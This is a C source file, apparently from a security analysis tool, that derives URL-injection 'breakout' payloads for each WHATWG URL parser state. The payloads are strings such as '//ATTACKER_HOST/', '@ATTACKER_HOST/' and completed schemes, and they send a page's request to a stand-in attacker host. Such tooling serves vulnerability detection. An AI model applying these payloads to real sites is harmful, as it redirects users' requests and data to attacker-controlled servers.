/* solver/solve_url.c — the request class's breakout, derived from the URL parser's state (see solve_url.h). */
#include "solver/solve_url.h"
#include "check.h"
#include "core/url/url.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *solve_url_witness(const char *base, const char *input)
{
    size_t bn, in;
    char *w;
    int k;

    DCHECK(base && *base && input, "a request witness was composed with no base or no input");
    bn = strlen(base);
    in = strlen(input);
    w = malloc(bn + in + 24);
    CHECK(w, "solve_url: OOM composing a request witness");
    k = snprintf(w, 24, "%zu:", bn);
    memcpy(w + k, base, bn);
    memcpy(w + k + bn, input, in + 1);
    return w;
}

/* Split a witness solve_url_witness composed: `*base` is owned by the caller, `*input` points into `w`. */
static void witness_split(const char *w, char **base, const char **input)
{
    char *end;
    unsigned long n = strtoul(w, &end, 10);

    CHECKF(end != w && *end == ':' && strlen(end + 1) >= n, "solve_url: `%s` is not a witness this file composed",
           w);
    *base = strndup(end + 1, n);
    CHECK(*base, "solve_url: OOM splitting a request witness");
    *input = end + 1 + n;
}

/* Emit `s` if every byte of it arrives as itself. */
static int emit_one(const char *s, const SolveDelivered *d, SolveUrlEmit emit, void *user)
{
    if (!solve_delivered_ok(d, s)) return 0;
    emit(user, s);
    return 1;
}

/* §4.4 scheme state holds the scheme buffer: the prefix less the leading C0 control or space bytes step 1
   strips and the tab and newline bytes step 3 removes, ASCII-lowercased as the state appends each byte. The
   attacker reaches an http(s) origin from it only by completing a special scheme the buffer begins. */
static int scheme_breakouts(const char *prefix, size_t len, const SolveDelivered *d, SolveUrlEmit emit,
                            void *user)
{
    static const char *const special[2] = { "https", "http" };
    char buf[16], out[96];
    size_t b = 0, n = 0;
    int built = 0;

    while (b < len && (unsigned char)prefix[b] <= 0x20) b++;
    for (; b < len; b++) {
        char c = prefix[b];
        if (c == 0x09 || c == 0x0a || c == 0x0d) continue;
        if (n + 1 >= sizeof buf) return 0;   /* longer than either special scheme: neither can be completed */
        buf[n++] = (char)((c >= 'A' && c <= 'Z') ? c + 32 : c);
    }
    buf[n] = 0;
    for (int i = 0; i < 2; i++) {
        if (strncmp(special[i], buf, n) != 0) continue;
        snprintf(out, sizeof out, "%s://%s/", special[i] + n, SOLVE_URL_ATTACKER_HOST);
        built += emit_one(out, d, emit, user);
    }
    return built;
}

int solve_url_breakouts(const char *witness, const SolveDelivered *d, SolveUrlEmit emit, void *user)
{
    char *base_s;
    const char *input, *at;
    UrlRecord base;
    UrlPrefixState st;
    int built = 0;

    witness_split(witness, &base_s, &input);
    at = strstr(input, SOLVE_URL_LOCATOR);
    if (!at) { free(base_s); return 0; }
    url_record_init(&base);
    CHECKF(url_parse(&base, base_s, strlen(base_s), NULL),
           "solve_url: the document base `%s` a request witness carries does not parse — the engine composed it "
           "from a document's base URL, which HTML §2.4.1 makes a URL record", base_s);
    st = url_prefix_state(input, (size_t)(at - input), &base);
    switch (st) {
    case URL_PREFIX_SCHEME_START:
        built += emit_one("https://" SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        built += emit_one("//" SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        break;
    case URL_PREFIX_SCHEME:
        built += scheme_breakouts(input, (size_t)(at - input), d, emit, user);
        break;
    case URL_PREFIX_NO_SCHEME:
    case URL_PREFIX_RELATIVE:
    case URL_PREFIX_SPECIAL_RELATIVE_OR_AUTHORITY:
    case URL_PREFIX_SPECIAL_AUTHORITY_SLASHES:
        built += emit_one("//" SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        break;
    case URL_PREFIX_RELATIVE_SLASH:
        built += emit_one("/" SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        break;
    case URL_PREFIX_SPECIAL_AUTHORITY_IGNORE_SLASHES:
        built += emit_one(SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        break;
    case URL_PREFIX_AUTHORITY:
        /* §4.4 authority state buffers until `@`, which makes everything before it credentials. */
        built += emit_one("@" SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        break;
    case URL_PREFIX_HOST:
        /* The host buffer may be empty (after `@`) or hold the page's own label, which a name under the
           attacker's host extends. */
        built += emit_one(SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        built += emit_one("." SOLVE_URL_ATTACKER_HOST "/", d, emit, user);
        break;
    case URL_PREFIX_PATH_OR_AUTHORITY:
    case URL_PREFIX_FILE:
    case URL_PREFIX_FILE_SLASH:
    case URL_PREFIX_FILE_HOST:
        /* A non-special or file scheme: no host it reaches is an HTTP origin a request is sent to. */
        break;
    case URL_PREFIX_FAILED:
    case URL_PREFIX_PORT:
    case URL_PREFIX_PATH_START:
    case URL_PREFIX_PATH:
    case URL_PREFIX_OPAQUE_PATH:
    case URL_PREFIX_QUERY:
    case URL_PREFIX_FRAGMENT:
        break;   /* the prefix decided the host (url_prefix_decides_host) */
    }
    url_record_free(&base);
    free(base_s);
    return built;
}
